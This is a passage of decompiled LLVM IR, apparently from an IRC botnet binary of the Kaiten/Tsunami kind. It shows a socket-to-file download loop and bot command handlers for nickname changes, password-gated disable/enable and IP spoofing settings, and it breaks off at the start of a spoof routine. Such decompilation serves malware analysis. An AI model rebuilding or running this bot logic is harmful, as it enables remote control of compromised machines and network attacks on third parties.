  %v4_8048c66 = sub nsw i8 %v1_8048c66, %v3_8048c66
  %v15_8048c66 = icmp eq i8 %v4_8048c66, 0
  %v20_8048c66 = zext i8 %v4_8048c66 to i32
  %v23_8048c66 = or i32 %v20_8048c66, %v3_8048c64
  store i32 %v23_8048c66, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c6f = icmp eq i1 %v15_8048c66, false
  br i1 %v1_8048c6f, label %dec_label_pc_8048d04, label %dec_label_pc_8048c75

dec_label_pc_8048c75:                             ; preds = %dec_label_pc_8048c22
  %v4_8048c75 = add i32 %storemerge5107, 4
  %v1_8048c84 = add i32 %v3_8048bc8, 52
  %v2_8048c84 = inttoptr i32 %v1_8048c84 to i32*
  %v1_8048c8e = add i32 %v3_8048bc8, 16
  %v2_8048c8e = inttoptr i32 %v1_8048c8e to i32*
  %v1_8048c94 = add i32 %v3_8048bc8, 28
  %v2_8048c94 = inttoptr i32 %v1_8048c94 to i32*
  %v10_8048cf989 = icmp ult i32 %v4_8048c75, %v5_8048bf0112
  store i1 %v10_8048cf989, i1* %cf.global-to-local, align 1
  %v5_8048cfc96 = icmp slt i32 %v4_8048c75, %v5_8048bf0112
  br i1 %v5_8048cfc96, label %dec_label_pc_8048c7b, label %dec_label_pc_8048d18

dec_label_pc_8048c7b:                             ; preds = %dec_label_pc_8048c75, %dec_label_pc_8048cf3
  %storemerge10.in97 = phi i32 [ %v4_8048cf3, %dec_label_pc_8048cf3 ], [ %v4_8048c75, %dec_label_pc_8048c75 ]
  %v3_8048c84 = load i32, i32* %v2_8048c84, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c87 = icmp eq i32 %v3_8048c84, 0
  br i1 %v1_8048c87, label %dec_label_pc_8048cd6, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c7b
  %v3_8048c8e = load i32, i32* %v2_8048c8e, align 4
  store i32 %v3_8048c8e, i32* %edx.global-to-local, align 4
  %v3_8048c94 = load i32, i32* %v2_8048c94, align 4
  %v7_8048c97 = icmp ult i32 %v3_8048c8e, %v3_8048c94
  store i1 %v7_8048c97, i1* %cf.global-to-local, align 1
  %v1_8048c99 = icmp eq i1 %v7_8048c97, false
  br i1 %v1_8048c99, label %dec_label_pc_8048cb7, label %dec_label_pc_8048c9b

dec_label_pc_8048c9b:                             ; preds = %dec_label_pc_8048c8b
  %v3_8048c9e = load i32, i32* %v2_8048c8e, align 4
  store i32 %v3_8048c9e, i32* %edx.global-to-local, align 4
  %v0_8048ca4 = load i32, i32* @ebp, align 4
  %v2_8048ca4 = add i32 %storemerge10.in97, -5188
  %v3_8048ca4 = add i32 %v2_8048ca4, %v0_8048ca4
  %v4_8048ca4 = inttoptr i32 %v3_8048ca4 to i8*
  %v5_8048ca4 = load i8, i8* %v4_8048ca4, align 1
  %v3_8048cac = inttoptr i32 %v3_8048c9e to i8*
  store i8 %v5_8048ca4, i8* %v3_8048cac, align 1
  %v0_8048cae = load i32, i32* %edx.global-to-local, align 4
  %v1_8048cae = add i32 %v0_8048cae, 1
  store i32 %v1_8048cae, i32* %edx.global-to-local, align 4
  store i32 %v1_8048cae, i32* %v2_8048c8e, align 4
  br label %dec_label_pc_8048cf3

dec_label_pc_8048cb7:                             ; preds = %dec_label_pc_8048c8b
  %v0_8048cba = load i32, i32* @ebp, align 4
  %v2_8048cba = add i32 %storemerge10.in97, -5188
  %v3_8048cba = add i32 %v2_8048cba, %v0_8048cba
  %v4_8048cba = inttoptr i32 %v3_8048cba to i8*
  %v5_8048cba = load i8, i8* %v4_8048cba, align 1
  %v6_8048cba = zext i8 %v5_8048cba to i32
  store i32 %v6_8048cba, i32* @edx, align 4
  %v4_8048ccf = call i32 @putc_unlocked(i8 %v5_8048cba, i32 %v3_8048bc8)
  br label %dec_label_pc_8048cf3

dec_label_pc_8048cd6:                             ; preds = %dec_label_pc_8048c7b
  %v0_8048cd9 = load i32, i32* @ebp, align 4
  %v2_8048cd9 = add i32 %storemerge10.in97, -5188
  %v3_8048cd9 = add i32 %v2_8048cd9, %v0_8048cd9
  %v4_8048cd9 = inttoptr i32 %v3_8048cd9 to i8*
  %v5_8048cd9 = load i8, i8* %v4_8048cd9, align 1
  %v6_8048cd9 = zext i8 %v5_8048cd9 to i32
  store i32 %v6_8048cd9, i32* @edx, align 4
  %v4_8048cee = call i32 @__GI_fputc(i8 %v5_8048cd9, i32 %v3_8048bc8)
  br label %dec_label_pc_8048cf3

dec_label_pc_8048cf3:                             ; preds = %dec_label_pc_8048cb7, %dec_label_pc_8048c9b, %dec_label_pc_8048cd6
  %v4_8048cf3 = add i32 %storemerge10.in97, 1
  %v10_8048cf9 = icmp ult i32 %v4_8048cf3, %v5_8048bf0112
  store i1 %v10_8048cf9, i1* %cf.global-to-local, align 1
  %exitcond117 = icmp eq i32 %v4_8048cf3, %v5_8048bf0112
  br i1 %exitcond117, label %dec_label_pc_8048d18, label %dec_label_pc_8048c7b

dec_label_pc_8048d04:                             ; preds = %dec_label_pc_8048c22
  %v4_8048d04 = add nuw nsw i32 %storemerge5107, 1
  %v10_8048d0a = icmp ult i32 %v4_8048d04, %v5_8048bf0112
  store i1 %v10_8048d0a, i1* %cf.global-to-local, align 1
  %v5_8048d0d = icmp slt i32 %v4_8048d04, %v5_8048bf0112
  br i1 %v5_8048d0d, label %dec_label_pc_8048c22, label %dec_label_pc_8048bd0.loopexit

dec_label_pc_8048d18.loopexit12:                  ; preds = %dec_label_pc_8048bd0.loopexit, %dec_label_pc_8048b6a
  %.pre23 = add i32 %v3_8048bc8, 52
  %.pre24 = inttoptr i32 %.pre23 to i32*
  %.pre25 = add i32 %v3_8048bc8, 16
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %.pre27 = add i32 %v3_8048bc8, 28
  %.pre28 = inttoptr i32 %.pre27 to i32*
  br label %dec_label_pc_8048d18

dec_label_pc_8048d18:                             ; preds = %dec_label_pc_8048c75, %dec_label_pc_8048cf3, %dec_label_pc_8048d18.loopexit12
  %v2_8048da6.pre-phi = phi i32* [ %.pre28, %dec_label_pc_8048d18.loopexit12 ], [ %v2_8048c94, %dec_label_pc_8048cf3 ], [ %v2_8048c94, %dec_label_pc_8048c75 ]
  %v2_8048da0.pre-phi = phi i32* [ %.pre26, %dec_label_pc_8048d18.loopexit12 ], [ %v2_8048c8e, %dec_label_pc_8048cf3 ], [ %v2_8048c8e, %dec_label_pc_8048c75 ]
  %v2_8048d96.pre-phi = phi i32* [ %.pre24, %dec_label_pc_8048d18.loopexit12 ], [ %v2_8048c84, %dec_label_pc_8048cf3 ], [ %v2_8048c84, %dec_label_pc_8048c75 ]
  store i1 %v5_8048bb8, i1* %cf.global-to-local, align 1
  %v3_8048d39 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8069880.47 to i32))
  %v5_8048d5e83 = call i32 @recv(i32 %v4_804897c, i32 %v2_8048be0, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6886 = icmp slt i32 %v5_8048d5e83, 1
  br i1 %tmp6886, label %dec_label_pc_8048e19, label %dec_label_pc_8048d70

dec_label_pc_8048d3e.loopexit:                    ; preds = %dec_label_pc_8048e05
  %v5_8048d5e = call i32 @recv(i32 %v4_804897c, i32 %v2_8048be0, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp68 = icmp slt i32 %v5_8048d5e, 1
  br i1 %tmp68, label %dec_label_pc_8048e19, label %dec_label_pc_8048d70

dec_label_pc_8048d70:                             ; preds = %dec_label_pc_8048d18, %dec_label_pc_8048d3e.loopexit
  %v5_8048d5e87 = phi i32 [ %v5_8048d5e, %dec_label_pc_8048d3e.loopexit ], [ %v5_8048d5e83, %dec_label_pc_8048d18 ]
  %v4_8048d70 = add i32 %v5_8048d5e87, -4095
  %v8_8048d70 = icmp ult i32 %v5_8048d5e87, 4095
  %v9_8048d70 = sub i32 4094, %v5_8048d5e87
  %v10_8048d70 = and i32 %v9_8048d70, %v5_8048d5e87
  %v11_8048d70 = icmp slt i32 %v10_8048d70, 0
  store i1 %v8_8048d70, i1* %cf.global-to-local, align 1
  %v12_8048d70 = icmp eq i32 %v4_8048d70, 0
  %v13_8048d70 = icmp slt i32 %v4_8048d70, 0
  %v3_8048d77 = icmp eq i1 %v13_8048d70, %v11_8048d70
  %v4_8048d77 = icmp eq i1 %v12_8048d70, false
  %v5_8048d77 = and i1 %v4_8048d77, %v3_8048d77
  br i1 %v5_8048d77, label %dec_label_pc_8048d8d.lr.ph, label %dec_label_pc_8048d79

dec_label_pc_8048d79:                             ; preds = %dec_label_pc_8048d70
  %v0_8048d7c = load i32, i32* @ebp, align 4
  %v2_8048d7c = add i32 %v5_8048d5e87, -5188
  %v3_8048d7c = add i32 %v2_8048d7c, %v0_8048d7c
  %v4_8048d7c = inttoptr i32 %v3_8048d7c to i8*
  store i8 0, i8* %v4_8048d7c, align 1
  br label %dec_label_pc_8048d8d.lr.ph

dec_label_pc_8048d8d.lr.ph:                       ; preds = %dec_label_pc_8048d79, %dec_label_pc_8048d70
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d8d

dec_label_pc_8048d8d:                             ; preds = %dec_label_pc_8048e05, %dec_label_pc_8048d8d.lr.ph
  %storemerge82 = phi i32 [ 0, %dec_label_pc_8048d8d.lr.ph ], [ %v4_8048e05, %dec_label_pc_8048e05 ]
  %v3_8048d96 = load i32, i32* %v2_8048d96.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d99 = icmp eq i32 %v3_8048d96, 0
  br i1 %v1_8048d99, label %dec_label_pc_8048de8, label %dec_label_pc_8048d9d

dec_label_pc_8048d9d:                             ; preds = %dec_label_pc_8048d8d
  %v3_8048da0 = load i32, i32* %v2_8048da0.pre-phi, align 4
  store i32 %v3_8048da0, i32* %edx.global-to-local, align 4
  %v3_8048da6 = load i32, i32* %v2_8048da6.pre-phi, align 4
  %v7_8048da9 = icmp ult i32 %v3_8048da0, %v3_8048da6
  store i1 %v7_8048da9, i1* %cf.global-to-local, align 1
  %v1_8048dab = icmp eq i1 %v7_8048da9, false
  br i1 %v1_8048dab, label %dec_label_pc_8048dc9, label %dec_label_pc_8048dad

dec_label_pc_8048dad:                             ; preds = %dec_label_pc_8048d9d
  %v3_8048db0 = load i32, i32* %v2_8048da0.pre-phi, align 4
  store i32 %v3_8048db0, i32* %edx.global-to-local, align 4
  %v0_8048db6 = load i32, i32* @ebp, align 4
  %v2_8048db6 = add nsw i32 %storemerge82, -5188
  %v3_8048db6 = add i32 %v2_8048db6, %v0_8048db6
  %v4_8048db6 = inttoptr i32 %v3_8048db6 to i8*
  %v5_8048db6 = load i8, i8* %v4_8048db6, align 1
  %v3_8048dbe = inttoptr i32 %v3_8048db0 to i8*
  store i8 %v5_8048db6, i8* %v3_8048dbe, align 1
  %v0_8048dc0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048dc0 = add i32 %v0_8048dc0, 1
  store i32 %v1_8048dc0, i32* %edx.global-to-local, align 4
  store i32 %v1_8048dc0, i32* %v2_8048da0.pre-phi, align 4
  br label %dec_label_pc_8048e05

dec_label_pc_8048dc9:                             ; preds = %dec_label_pc_8048d9d
  %v0_8048dcc = load i32, i32* @ebp, align 4
  %v2_8048dcc = add nsw i32 %storemerge82, -5188
  %v3_8048dcc = add i32 %v2_8048dcc, %v0_8048dcc
  %v4_8048dcc = inttoptr i32 %v3_8048dcc to i8*
  %v5_8048dcc = load i8, i8* %v4_8048dcc, align 1
  %v6_8048dcc = zext i8 %v5_8048dcc to i32
  store i32 %v6_8048dcc, i32* @edx, align 4
  %v4_8048de1 = call i32 @putc_unlocked(i8 %v5_8048dcc, i32 %v3_8048bc8)
  br label %dec_label_pc_8048e05

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048d8d
  %v0_8048deb = load i32, i32* @ebp, align 4
  %v2_8048deb = add nsw i32 %storemerge82, -5188
  %v3_8048deb = add i32 %v2_8048deb, %v0_8048deb
  %v4_8048deb = inttoptr i32 %v3_8048deb to i8*
  %v5_8048deb = load i8, i8* %v4_8048deb, align 1
  %v6_8048deb = zext i8 %v5_8048deb to i32
  store i32 %v6_8048deb, i32* @edx, align 4
  %v4_8048e00 = call i32 @__GI_fputc(i8 %v5_8048deb, i32 %v3_8048bc8)
  br label %dec_label_pc_8048e05

dec_label_pc_8048e05:                             ; preds = %dec_label_pc_8048dc9, %dec_label_pc_8048dad, %dec_label_pc_8048de8
  %v4_8048e05 = add nuw nsw i32 %storemerge82, 1
  %v10_8048e0b = icmp ult i32 %v4_8048e05, %v5_8048d5e87
  store i1 %v10_8048e0b, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048e05, %v5_8048d5e87
  br i1 %exitcond, label %dec_label_pc_8048d3e.loopexit, label %dec_label_pc_8048d8d

dec_label_pc_8048e19:                             ; preds = %dec_label_pc_8048d3e.loopexit, %dec_label_pc_8048d18
  %v1_8048e1f = inttoptr i32 %v3_8048bc8 to i16*
  %v2_8048e1f = call i32 @__GI_fclose(i16* %v1_8048e1f)
  %v1_8048e2a = call i32 @close(i32 %v4_804897c)
  %v1_8048e36 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048e3b

dec_label_pc_8048e3b:                             ; preds = %entry, %dec_label_pc_8048e19
  %v0_8048e44 = phi i32 [ %v1_804892c, %entry ], [ %v1_8048e36, %dec_label_pc_8048e19 ]
  %v0_8048e3b = load i32, i32* @esp, align 4
  %v2_8048e3b = icmp ugt i32 %v0_8048e3b, -5233
  store i1 %v2_8048e3b, i1* %cf.global-to-local, align 1
  ret i32 %v0_8048e44

; uselistorder directives
  uselistorder i32 %storemerge82, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048d70, { 1, 0 }
  uselistorder i32 %v5_8048d5e87, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048da0.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048d04, { 1, 0, 2 }
  uselistorder i32 %v4_8048cf3, { 1, 2, 0 }
  uselistorder i32 %storemerge10.in97, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048c5e, { 1, 0 }
  uselistorder i32 %v7_8048c5c, { 1, 0 }
  uselistorder i32 %storemerge5107, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048c02, { 1, 0 }
  uselistorder i32 %v5_8048bf0112, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048be0, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v3_8048bc8, { 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %v1_8048aa3, { 1, 0, 2 }
  uselistorder i32 %storemerge6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a42.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_8048a1f, { 2, 0, 1 }
  uselistorder i1 %v0_80489e7, { 1, 0 }
  uselistorder i32 %v4_804897c, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048939, { 1, 0 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 5, 8, 6, 7, 4, 9, 10, 0, 11, 18, 14, 12, 13, 1, 15, 16, 17, 2, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048e3b, { 1, 0 }
  uselistorder label %dec_label_pc_8048e05, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048d70, { 1, 0 }
  uselistorder label %dec_label_pc_8048d18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cf3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c7b, { 1, 0 }
  uselistorder label %dec_label_pc_8048c22, { 1, 0 }
  uselistorder label %dec_label_pc_8048c02, { 1, 0 }
  uselistorder label %dec_label_pc_8048b6a, { 1, 0 }
  uselistorder label %dec_label_pc_8048b13, { 1, 0 }
  uselistorder label %dec_label_pc_8048aee, { 1, 0 }
  uselistorder label %dec_label_pc_8048a3f, { 1, 0 }
  uselistorder label %dec_label_pc_8048a33, { 1, 0 }
  uselistorder label %dec_label_pc_80489b0, { 1, 0 }
  uselistorder label %dec_label_pc_8048965, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp34 = call i8 @__decompiler_undefined_function_5()
  %v0_8048e4e = load i8*, i8** @global_var_80756cc.33, align 4
  %v1_8048e4e = ptrtoint i8* %v0_8048e4e to i32
  %v0_8048e56 = load i64, i64* @global_var_80756d0.34, align 8
  %v1_8048e56 = trunc i64 %v0_8048e56 to i32
  %v9_8048e6d = icmp eq i32 %v1_8048e56, 1
  %v1_8048e70 = icmp eq i1 %v9_8048e6d, false
  br i1 %v1_8048e70, label %dec_label_pc_8048ecc, label %dec_label_pc_8048e72

dec_label_pc_8048e72:                             ; preds = %entry
  %v1_8048e78 = urem i32 %v1_8048e4e, 256
  store i32 %v1_8048e78, i32* @ebx, align 4
  %v3_8048ec2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8069898.48 to i32))
  br label %dec_label_pc_8048f68

dec_label_pc_8048ecc:                             ; preds = %entry
  %v3_8048ee517 = zext i8 %tmp34 to i32
  store i32 %v3_8048ee517, i32* @ebx, align 4
  %v3_8048ef118 = zext i8 %tmp33 to i32
  store i32 %v3_8048ef118, i32* @esi, align 4
  %v1_8048efd = urem i32 %v1_8048e4e, 256
  store i32 %v1_8048efd, i32* @edi, align 4
  %v3_8048f63 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_80698b8.49 to i32))
  br label %dec_label_pc_8048f68

dec_label_pc_8048f68:                             ; preds = %dec_label_pc_8048e72, %dec_label_pc_8048ecc
  %storemerge = phi i32 [ %v3_8048f63, %dec_label_pc_8048ecc ], [ %v3_8048ec2, %dec_label_pc_8048e72 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048f68, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f70 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f70, i32* %stack_var_-4, align 4
  %v4_8048f70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048f70, i32* @ebp, align 4
  %v3_8048f8b = call i32 @Send(i32 %arg1, i32 ptrtoint ([70 x i8]* @global_var_80698e8.50 to i32))
  ret i32 %v3_8048f8b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8048f99 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f99, label %dec_label_pc_8048fbb, label %dec_label_pc_8048f9f

dec_label_pc_8048f9f:                             ; preds = %entry
  %v3_8048fb4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_806992e.51 to i32))
  br label %dec_label_pc_8049025

dec_label_pc_8048fbb:                             ; preds = %entry
  %v1_8048fbe = add i32 %arg4, 4
  %v1_8048fc1 = inttoptr i32 %v1_8048fbe to i32*
  %v2_8048fc1 = load i32, i32* %v1_8048fc1, align 4
  store i1 false, i1* @df, align 1
  %v4_8048fce = inttoptr i32 %v2_8048fc1 to i8*
  store i32 %v2_8048fc1, i32* @edi, align 4
  %v3_8048fd1 = call i32 @_strlen(i8* %v4_8048fce)
  %v4_8048fd1 = mul i32 %v3_8048fd1, -1
  %v1_8048fd7 = sub i32 0, %v4_8048fd1
  %v2_8048fd8 = icmp ult i32 %v1_8048fd7, 32
  %v6_8048fd8 = icmp eq i32 %v4_8048fd1, -32
  %v2_8048fdb = or i1 %v2_8048fd8, %v6_8048fd8
  br i1 %v2_8048fdb, label %dec_label_pc_8048ff9, label %dec_label_pc_8048fdd

dec_label_pc_8048fdd:                             ; preds = %dec_label_pc_8048fbb
  %v3_8048ff2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_8069948.52 to i32))
  br label %dec_label_pc_8049025

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048fbb
  %v2_8048fff = load i32, i32* %v1_8048fc1, align 4
  store i32 %v2_8048fff, i32* @global_var_807e1ac.53, align 4
  %v3_8049020 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_806997e.54 to i32))
  br label %dec_label_pc_8049025

dec_label_pc_8049025:                             ; preds = %dec_label_pc_8048fdd, %dec_label_pc_8048f9f, %dec_label_pc_8048ff9
  %v0_804902a = phi i32 [ %v3_8048ff2, %dec_label_pc_8048fdd ], [ %v3_8048fb4, %dec_label_pc_8048f9f ], [ %v3_8049020, %dec_label_pc_8048ff9 ]
  ret i32 %v0_804902a

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049025, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804902e = load i32, i32* @ebx, align 4
  store i32 %v0_804902e, i32* %stack_var_-8, align 4
  %v2_8049039 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049039, i32* @ebx, align 4
  %v1_8049040 = call i32 @__libc_getpid(i32 0)
  %v0_8049045 = load i32, i32* @ebx, align 4
  %v2_8049045 = add i32 %v0_8049045, %v1_8049040
  %v1_804904b = call i32 @srand(i32 %v2_8049045)
  %v0_8049050 = call i32 @random()
  store i32 %v0_8049050, i32* @ecx, align 4
  %v2_804905d = sub i32 1, %arg1
  %v1_804905f = add i32 %v2_804905d, %arg2
  %v5_8049060 = sext i32 %v1_804905f to i64
  %v1_8049065 = ashr i32 %v0_8049050, 31
  %v6_8049066 = zext i32 %v0_8049050 to i64
  %v8_8049066 = zext i32 %v1_8049065 to i64
  %v9_8049066 = mul nuw i64 %v8_8049066, 4294967296
  %v10_8049066 = or i64 %v9_8049066, %v6_8049066
  %v14_8049066 = srem i64 %v10_8049066, %v5_8049060
  %v15_8049066 = trunc i64 %v14_8049066 to i32
  %v5_804906b = add i32 %v15_8049066, %arg1
  %v2_8049071 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049071, i32* @ebx, align 4
  ret i32 %v5_804906b

; uselistorder directives
  uselistorder i32 %v0_8049050, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804908a = call i32 @realrand(i32 4, i32 8)
  %v1_8049092 = inttoptr i32 %v3_804908a to i8*
  %v2_8049092 = call i32 @randstring(i8* %v1_8049092)
  store i32 %v2_8049092, i32* @global_var_807e1ac.53, align 4
  store i32 %v2_8049092, i32* @ebx, align 4
  %v0_80490a2 = call i32 @getBuild()
  %v3_80490c5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_806998f.56 to i32))
  ret i32 %v3_80490c5
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_80490d7 = icmp eq i32 %arg3, 1
  br i1 %v12_80490d7, label %dec_label_pc_8049138, label %dec_label_pc_80490dd

dec_label_pc_80490dd:                             ; preds = %entry
  %v3_80490f2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_806999f.57 to i32))
  %v3_804912e = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_80699e0.60 to i32))
  br label %dec_label_pc_80491f2

dec_label_pc_8049138:                             ; preds = %entry
  %v0_8049138 = load i8, i8* @global_var_80756c8.28, align 8
  %v4_804913f = icmp eq i8 %v0_8049138, 0
  br i1 %v4_804913f, label %dec_label_pc_8049162, label %dec_label_pc_8049143

dec_label_pc_8049143:                             ; preds = %dec_label_pc_8049138
  %v3_8049158 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8069a02.61 to i32))
  br label %dec_label_pc_80491f2

dec_label_pc_8049162:                             ; preds = %dec_label_pc_8049138
  %v1_8049165 = add i32 %arg4, 4
  %v1_8049168 = inttoptr i32 %v1_8049165 to i32*
  %v2_8049168 = load i32, i32* %v1_8049168, align 4
  store i1 false, i1* @df, align 1
  %v4_8049175 = inttoptr i32 %v2_8049168 to i8*
  store i32 %v2_8049168, i32* @edi, align 4
  %v3_8049178 = call i32 @_strlen(i8* %v4_8049175)
  %v4_8049178 = mul i32 %v3_8049178, -1
  %v1_804917e = sub i32 0, %v4_8049178
  %v5_804917f = icmp ult i32 %v1_804917e, 254
  %v9_804917f = icmp eq i32 %v4_8049178, -254
  %v2_8049184 = or i1 %v5_804917f, %v9_804917f
  br i1 %v2_8049184, label %dec_label_pc_80491a2, label %dec_label_pc_8049186

dec_label_pc_8049186:                             ; preds = %dec_label_pc_8049162
  %v3_804919b = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8069a20.62 to i32))
  br label %dec_label_pc_80491f2

dec_label_pc_80491a2:                             ; preds = %dec_label_pc_8049162
  store i8 1, i8* @global_var_80756c8.28, align 8
  %v5_80491c2 = call i32 @__GI_memset(i8* bitcast (i32* @global_var_807e0a0.63 to i8*), i32 0, i32 256)
  %v2_80491cd = load i32, i32* %v1_8049168, align 4
  store i32 %v2_80491cd, i32* @eax, align 4
  %v4_80491da = call i32 @strcpy(i8* bitcast (i32* @global_var_807e0a0.63 to i8*), i32 %v2_80491cd)
  %v3_80491ed = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8069a48.64 to i32))
  br label %dec_label_pc_80491f2

dec_label_pc_80491f2:                             ; preds = %dec_label_pc_8049186, %dec_label_pc_8049143, %dec_label_pc_80490dd, %dec_label_pc_80491a2
  %v0_80491f7 = phi i32 [ %v3_804919b, %dec_label_pc_8049186 ], [ %v3_8049158, %dec_label_pc_8049143 ], [ %v3_804912e, %dec_label_pc_80490dd ], [ %v3_80491ed, %dec_label_pc_80491a2 ]
  ret i32 %v0_80491f7

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80491f2, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_80491fe = icmp eq i32 %arg3, 1
  br i1 %v12_80491fe, label %dec_label_pc_804925f, label %dec_label_pc_8049204

dec_label_pc_8049204:                             ; preds = %entry
  %v3_8049219 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8069a67.65 to i32))
  %v3_8049255 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_80699e0.60 to i32))
  br label %dec_label_pc_80492df

dec_label_pc_804925f:                             ; preds = %entry
  %v0_804925f = load i8, i8* @global_var_80756c8.28, align 8
  %v4_8049266 = icmp eq i8 %v0_804925f, 0
  %v1_8049268 = icmp eq i1 %v4_8049266, false
  br i1 %v1_8049268, label %dec_label_pc_8049286, label %dec_label_pc_804926a

dec_label_pc_804926a:                             ; preds = %dec_label_pc_804925f
  %v3_804927f = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8069a81.66 to i32))
  br label %dec_label_pc_80492df

dec_label_pc_8049286:                             ; preds = %dec_label_pc_804925f
  %v1_8049289 = add i32 %arg4, 4
  %v1_804928c = inttoptr i32 %v1_8049289 to i32*
  %v2_804928c = load i32, i32* %v1_804928c, align 4
  %v4_8049299 = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_807e0a0.63 to i8*), i32 %v2_804928c)
  %v1_804929e = icmp eq i32 %v4_8049299, 0
  br i1 %v1_804929e, label %dec_label_pc_80492be, label %dec_label_pc_80492a2

dec_label_pc_80492a2:                             ; preds = %dec_label_pc_8049286
  %v3_80492b7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8069a9e.67 to i32))
  br label %dec_label_pc_80492df

dec_label_pc_80492be:                             ; preds = %dec_label_pc_8049286
  store i8 0, i8* @global_var_80756c8.28, align 8
  %v3_80492da = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8069ab9.68 to i32))
  br label %dec_label_pc_80492df

dec_label_pc_80492df:                             ; preds = %dec_label_pc_80492a2, %dec_label_pc_804926a, %dec_label_pc_8049204, %dec_label_pc_80492be
  %v0_80492e0 = phi i32 [ %v3_80492b7, %dec_label_pc_80492a2 ], [ %v3_804927f, %dec_label_pc_804926a ], [ %v3_8049255, %dec_label_pc_8049204 ], [ %v3_80492da, %dec_label_pc_80492be ]
  ret i32 %v0_80492e0

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80492df, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
